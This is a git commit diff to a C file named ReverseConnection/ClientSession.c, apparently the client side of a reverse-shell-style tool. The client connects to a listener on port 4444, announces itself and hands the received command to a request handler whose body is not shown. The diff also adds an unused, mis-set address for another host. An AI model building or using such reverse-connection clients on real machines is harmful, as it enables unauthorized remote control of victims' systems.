089d86f887366b107110c6c8f328b938bca15b2d
themonk14 <prudhvir14@protonmail.me>
2021-07-26 21:03:13 +0530

    Startup script

--- ReverseConnection/ClientSession.c
+++ ReverseConnection/ClientSession.c
@@ -13,13 +13,20 @@ void handleRequest(char *req)
 
 int main(int argc, char **argv)
 {
-    printf("Starting Reverse Connection\n")
+    printf("Starting Reverse Connection\n");
     struct sockaddr_in addr;
     struct sockaddr_in srv;
-    int sock,data = 0;
+    int data = 0;
     char buffer[256];
+    int sockfd =socket(AF_INET,SOCK_STREAM,0);
+    memset(&addr,'0',sizeof(addr));
 
-    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = inet_addr("192.168.0.233");
+    addr.sin_port= 8989;
+
+    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
     {
         printf("Error creating socket! Stopping...\n");
         return -9;
@@ -29,21 +36,21 @@ int main(int argc, char **argv)
 
     srv.sin_family = AF_INET;
     srv.sin_port = htons(4444);
-
-    if (inet_pton(AF_INET,"127.0.0.1",&srv.sin_addr) <= 0)
+    
+    if ((inet_pton(AF_INET,"127.0.0.1",&srv.sin_addr)) <= 0)
     {
         printf("Bad address ! Stopping....\n");
-        return -8
+        return -8;
     }
 
-    if(connect(sock, (struct sockaddr *)&srv,sizeof(srv))< 0)
+    if(connect(sockfd, (struct sockaddr *)&srv,sizeof(srv))< 0)
     {
         printf("Can't connect! Stopping...\n");
         return -6;
     }
 
-    send(sock,"Connected\n", strlen("Connected\n"),0);
-    data = read(sock,buffer,255);
+    send(sockfd,"Connected\n", strlen("Connected\n"),0);
+    data = read(sockfd,buffer,255);
     handleRequest(buffer);
 
     return 0;
